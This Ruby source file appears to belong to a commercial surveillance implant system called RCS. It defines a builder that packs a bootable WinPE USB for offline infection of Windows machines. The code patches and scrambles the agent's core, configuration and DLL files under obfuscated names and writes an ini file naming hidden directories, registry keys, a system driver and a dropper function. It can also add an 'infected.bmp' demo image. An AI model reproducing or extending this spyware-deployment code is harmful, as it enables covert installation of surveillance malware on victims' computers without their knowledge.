#
# Bootable USB drive
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildUSB < Build

  def initialize
    super
    @platform = 'offline'
  end

  def load(params)
    trace :debug, "Build: load: #{params}"

    params['platform'] = @platform
    super
  end

  def generate(params)
    trace :debug, "Build: generate: #{params}"

    build = Build.factory(:windows)

    build.load({'_id' => @factory._id})
    build.unpack
    build.patch params['binary'].dup
    build.scramble

    names = build.scrambled.dup

    # copy the scrambled files in our directories
    build.scrambled.keep_if {|k, v| k != :dir and k != :reg}.each_pair do |k, v|
      FileUtils.mkdir_p(path("winpe/RCSPE/files/WINDOWS"))
      FileUtils.cp(File.join(build.tmpdir, v), path("winpe/RCSPE/files/WINDOWS/" + v))
      @outputs << "winpe/RCSPE/files/WINDOWS/" + v
    end

    FileUtils.cp(File.join(build.tmpdir, 'demo_image'), path("winpe/RCSPE/files/WINDOWS/infected.bmp")) if params['demo']

    # if mac was not built, delete it to avoid errors during installation without osx
    if Dir[path("winpe/RCSPE/files/OSX/*")].size == 1
      FileUtils.rm_rf(path("winpe/RCSPE/files/OSX"))
    end

    build.clean

    key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase

    # calculate the function name for the dropper
    funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]

    # write the ini file
    File.open(path('winpe/RCSPE/RCS.ini'), 'w') do |f|
      f.puts "[RCS]"
      f.puts "VERSION=#{File.read(Dir.pwd + '/config/VERSION')}"
      f.puts "HUID=#{@factory.ident}"
      f.puts "HCORE=#{names[:core]}"
      f.puts "HCONF=#{names[:config]}"
      f.puts "CODEC=#{names[:codec]}"
      f.puts "DLL64=#{names[:core64]}"

      # TODO: driver removal
      f.puts "HDRV=null"
      f.puts "DRIVER64=null"

      #f.puts "HDRV=#{names[:driver]}"
      #f.puts "DRIVER64=#{names[:driver64]}"

      f.puts "HDIR=#{names[:dir]}"
      f.puts "HREG=#{names[:reg]}"
      f.puts "HOLDDIR=#{names[:olddir]}"
      f.puts "HOLDREG=#{names[:oldreg]}"
      f.puts "HSYS=ndisk.sys"
      f.puts "HKEY=#{key}"
      f.puts "FUNC=" + funcname
      f.puts "MASK=#{params['dump_mask']}"
    end

    @outputs << 'winpe/RCSPE/RCS.ini'
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      @outputs.keep_if {|x| x['winpe']}.each do |out|
        next unless File.file?(path(out))
        name = out.gsub("winpe/", '')
        z.file.open(name, "wb") { |f| f.write File.open(path(out), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']
  end

end

end #DB::
end #RCS::
